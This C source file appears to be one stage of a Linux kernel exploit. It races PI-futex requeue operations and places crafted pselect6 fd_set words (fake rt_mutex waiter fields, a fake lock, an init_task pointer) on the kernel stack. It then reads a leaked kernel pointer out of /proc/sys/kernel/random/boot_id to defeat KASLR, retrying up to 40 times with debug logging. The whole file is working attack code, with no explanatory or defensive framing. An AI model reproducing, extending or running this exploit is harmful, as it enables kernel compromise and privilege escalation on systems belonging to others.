#include "common.h"

#define SLIDE_MAX_ATTEMPTS 40
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_PSELECT_PAD_BYTES 0
#define SLIDE_PSELECT_WORD_SHIFT_BASE 0
#define SLIDE_WAIT_SECONDS 10

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_go;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_calls;

static int slide_word_shift;

void *slide_consumer_thread(void *arg __attribute__((unused)));

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return slide_word_shift + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return fdset_get_word(in, word_idx);
    case 1:
      return fdset_get_word(out, word_idx);
    case 2:
      return fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

static void prepare_slide_pselect_fdsets_shifted(
    fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
  struct slide_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    {0, SLIDE_LOGGERS_0_1, "tree_pc"},
    {1, 0, "tree_right"},
    {2, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {5, SLIDE_LOGGERS_0_1, "pi0"},
    {6, 0, "pi1"},
    {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi2"},
    {8, FAKE_WAITER_PRIO, "pi_prio"},
    {9, 0, "pi_deadline"},
    {10, SLIDE_INIT_TASK, "task"},
    {11, fake_lock, "lock"},
    {12, 3, "wake_state"},
    {13, 0, "ww_ctx"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

void slide_pselect_stack_copy(void) {
  dprintf(STDERR_FILENO, "[dbg] pselect_stack_copy: page_base=%016zx fake_lock=%016zx fake_w0=%016zx\n",
          page_base, fake_lock, fake_w0); fflush(stderr);
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  dprintf(STDERR_FILENO, "[dbg] pselect_stack_copy: creating pipe and timerfd\n"); fflush(stderr);

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  dprintf(STDERR_FILENO, "[dbg] pselect_stack_copy: about to prepare_fdsets\n"); fflush(stderr);
  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets_shifted(&in, &out, &ex);
  dprintf(STDERR_FILENO, "[dbg] pselect_stack_copy: about to open_selected_fds\n"); fflush(stderr);
  open_slide_selected_fds(&in, &out, &ex, high_read);

  struct timespec timeout = {
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  struct timespec *timeoutp = &timeout;

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_calls, 0);
  pthread_t consumer;
  dprintf(STDERR_FILENO, "[dbg] pselect_stack_copy: about to create consumer thread\n"); fflush(stderr);
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  dprintf(STDERR_FILENO, "[dbg] pselect_stack_copy: about to call pselect shift=%d\n",
          slide_word_shift); fflush(stderr);

  /* TEST 1: minimal select(0, NULL, NULL, NULL, &tv) to isolate if syscall itself crashes */
  struct timeval test_tv = {.tv_sec = 0, .tv_usec = 1000}; /* 1ms */
  dprintf(STDERR_FILENO, "[dbg] TEST: about to select(0, NULL, NULL, NULL, 1ms)\n"); fflush(stderr);
  int test_ret = select(0, NULL, NULL, NULL, &test_tv);
  dprintf(STDERR_FILENO, "[dbg] TEST: select(0) returned ret=%d errno=%d\n", test_ret, errno); fflush(stderr);

  /* TEST 2: select(1, &single, ...) with just the blocking fd */
  fd_set single_fd;
  FD_ZERO(&single_fd);
  FD_SET(SLIDE_PSELECT_NFDS - 1, &single_fd);
  test_tv.tv_sec = 0; test_tv.tv_usec = 1000;
  dprintf(STDERR_FILENO, "[dbg] TEST: about to select(1, NULL, NULL, &ex, 1ms)\n"); fflush(stderr);
  test_ret = select(SLIDE_PSELECT_NFDS, NULL, NULL, &single_fd, &test_tv);
  dprintf(STDERR_FILENO, "[dbg] TEST: select(1) returned ret=%d errno=%d\n", test_ret, errno); fflush(stderr);

  sync(); /* flush logs */
  usleep(50000); /* 50ms gap before real pselect */

  /* TEST 3: pselect(0, NULL, NULL, NULL, &tv, NULL) to check if pselect6 syscall itself works */
  struct timespec pselect_tv = {.tv_sec = 0, .tv_nsec = 1000000}; /* 1ms */
  dprintf(STDERR_FILENO, "[dbg] TEST: about to pselect(0, NULL, NULL, NULL, 1ms, NULL)\n"); fflush(stderr);
  test_ret = pselect(0, NULL, NULL, NULL, &pselect_tv, NULL);
  dprintf(STDERR_FILENO, "[dbg] TEST: pselect(0) returned ret=%d errno=%d\n", test_ret, errno); fflush(stderr);

  /* TEST 4: pselect(320, &clean, &clean, &clean_ex, &tv, NULL) with clean fd_sets */
  fd_set clean_in, clean_out, clean_ex;
  FD_ZERO(&clean_in); FD_ZERO(&clean_out); FD_ZERO(&clean_ex);
  FD_SET(SLIDE_PSELECT_NFDS - 1, &clean_ex);
  pselect_tv.tv_sec = 0; pselect_tv.tv_nsec = 1000000;
  dprintf(STDERR_FILENO, "[dbg] TEST: about to pselect(320, clean, 1ms, NULL)\n"); fflush(stderr);
  test_ret = pselect(SLIDE_PSELECT_NFDS, &clean_in, &clean_out, &clean_ex, &pselect_tv, NULL);
  dprintf(STDERR_FILENO, "[dbg] TEST: pselect(320, clean) returned ret=%d errno=%d\n", test_ret, errno); fflush(stderr);

  sync(); /* flush logs */
  usleep(50000);

  /* TEST 5: select(320, &in, &out, &ex, &tv) with REAL fd_set data to check if select also crashes */
  struct timeval real_tv = {.tv_sec = 0, .tv_usec = 1000}; /* 1ms */
  dprintf(STDERR_FILENO, "[dbg] TEST: about to select(320, real_fds, 1ms)\n"); fflush(stderr);
  test_ret = select(SLIDE_PSELECT_NFDS, &in, &out, &ex, &real_tv);
  dprintf(STDERR_FILENO, "[dbg] TEST: select(320, real_fds) returned ret=%d errno=%d\n", test_ret, errno); fflush(stderr);

  sync();
  usleep(50000);

  dprintf(STDERR_FILENO, "[dbg] about to call real pselect shift=%d\n",
          slide_word_shift); fflush(stderr);
  atomic_store(&slide_consume_go, 1);
  errno = 0;
  /* Use syscall() directly to bypass libc's pselect() wrapper (which creates
   * a sigmask_struct on the stack that triggers kernel panic with this fd_set) */
  int ret = syscall(__NR_pselect6, SLIDE_PSELECT_NFDS, &in, &out, &ex,
                    timeoutp, NULL);
  int saved_errno = errno;
  dprintf(STDERR_FILENO, "[dbg] pselect returned ret=%d errno=%d\n", ret, saved_errno); fflush(stderr);
  atomic_store(&slide_consume_go, 0);
  pr_info("slide pselect returned ret=%d errno=%d shift=%d sched_ok=%d calls=%d\n",
          ret, saved_errno, slide_word_shift,
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_calls));

  pthread_join(consumer, NULL);

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

static void slide_alarm_handler(int sig __attribute__((unused))) {
  syscall(SYS_setpriority, PRIO_PROCESS, 0, 5);
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  dprintf(STDERR_FILENO, "[dbg] consumer alive on core %d\n", CONSUMER_CORE); fflush(stderr);

  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    usleep(1000);

    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    atomic_store(&slide_consume_calls, calls + 1);
    errno = 0;
    long ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
    int call_errno = errno;
    if (ret == 0) {
      atomic_fetch_add(&slide_consume_sched_ok, 1);
    }
    pr_info("slide consumer sched tid=%d ret=%ld errno=%d sched_ok=%d\n",
            tid, ret, call_errno, atomic_load(&slide_consume_sched_ok));

    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);
  dprintf(STDERR_FILENO, "[dbg] waiter alive tid=%d\n", tid); fflush(stderr);

  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = slide_alarm_handler;
  sigemptyset(&sa.sa_mask);
  sigaction(SIGALRM, &sa, NULL);

  sigset_t unblock;
  sigemptyset(&unblock);
  sigaddset(&unblock, SIGALRM);
  pthread_sigmask(SIG_UNBLOCK, &unblock, NULL);

  dprintf(STDERR_FILENO, "[dbg] waiter about to lock chain\n"); fflush(stderr);
  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  dprintf(STDERR_FILENO, "[dbg] waiter locked chain, waiting for owner\n"); fflush(stderr);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  dprintf(STDERR_FILENO, "[dbg] waiter about to FUTEX_WAIT_REQUEUE_PI\n"); fflush(stderr);
  atomic_store(&slide_waiter_waiting, 1);
  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
           &slide_f_pi_target, 0);
  dprintf(STDERR_FILENO, "[dbg] waiter FUTEX_WAIT_REQUEUE_PI returned\n"); fflush(stderr);
  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

  signal(SIGALRM, SIG_DFL);

  dprintf(STDERR_FILENO, "[dbg] waiter about to pselect_stack_copy\n"); fflush(stderr);
  slide_pselect_stack_copy();
  dprintf(STDERR_FILENO, "[dbg] waiter pselect_stack_copy done\n"); fflush(stderr);
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  dprintf(STDERR_FILENO, "[dbg] owner alive\n"); fflush(stderr);
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }
  dprintf(STDERR_FILENO, "[dbg] owner locked target\n"); fflush(stderr);

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  dprintf(STDERR_FILENO, "[dbg] owner about to lock chain\n"); fflush(stderr);
  atomic_store(&slide_owner_started, 1);
  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  dprintf(STDERR_FILENO, "[dbg] slide_read_stext entered\n"); fflush(stderr);
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}

uint64_t slide_child_leak_stext(void) {
  dprintf(STDERR_FILENO, "[dbg] slide_child_leak_stext entered\n"); fflush(stderr);
  sigset_t block;
  sigemptyset(&block);
  sigaddset(&block, SIGALRM);
  pthread_sigmask(SIG_BLOCK, &block, NULL);

  dprintf(STDERR_FILENO, "[dbg] about to create waiter thread\n"); fflush(stderr);
  pthread_t waiter;
  pthread_t owner;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  dprintf(STDERR_FILENO, "[dbg] waiter thread created, about to create owner thread\n"); fflush(stderr);
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  dprintf(STDERR_FILENO, "[dbg] owner thread created, waiting for both\n"); fflush(stderr);

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  errno = 0;
  futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
           &slide_f_pi_target, 0);

  usleep(50000);
  pthread_kill(waiter, SIGALRM);

  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }

  return slide_read_stext();
}

int slide_leak_kernel_base(void) {
  int shifts[] = {0, 1, 2, 3, -1, -2};
  int n_shifts = sizeof(shifts) / sizeof(shifts[0]);

  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    slide_word_shift = shifts[(attempt - 1) % n_shifts];

    dprintf(STDERR_FILENO, "[dbg] slide attempt %d shift=%d\n", attempt, slide_word_shift); fflush(stderr);
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      dprintf(STDERR_FILENO, "[dbg] slide attempt %d no kernel page\n", attempt); fflush(stderr);
      continue;
    }
    dprintf(STDERR_FILENO, "[dbg] slide attempt %d kernel page=%016zx lock=%016zx w0=%016zx\n",
            attempt, page_base, fake_lock, fake_w0); fflush(stderr);

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    dprintf(STDERR_FILENO, "[dbg] slide attempt %d about to fork\n", attempt); fflush(stderr);
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      dprintf(STDERR_FILENO, "[dbg] child (pid=%d) started\n", getpid()); fflush(stderr);
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
      dprintf(STDERR_FILENO, "[dbg] about to call slide_child_leak_stext\n"); fflush(stderr);
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));

    if (n == (ssize_t)sizeof(stext) && WIFEXITED(status) &&
        WEXITSTATUS(status) == 0 && stext) {
      kaslr_base = stext;
      kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
      kaslr_done = 1;
      pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx shift=%d\n",
                 getpid(), (unsigned long long)kaslr_base,
                 (unsigned long long)kaslr_slide, slide_word_shift);
      return 1;
    }

    pr_warning("slide attempt %d failed n=%zd status=%d shift=%d\n",
               attempt, n, status, slide_word_shift);
  }

  return 0;
}
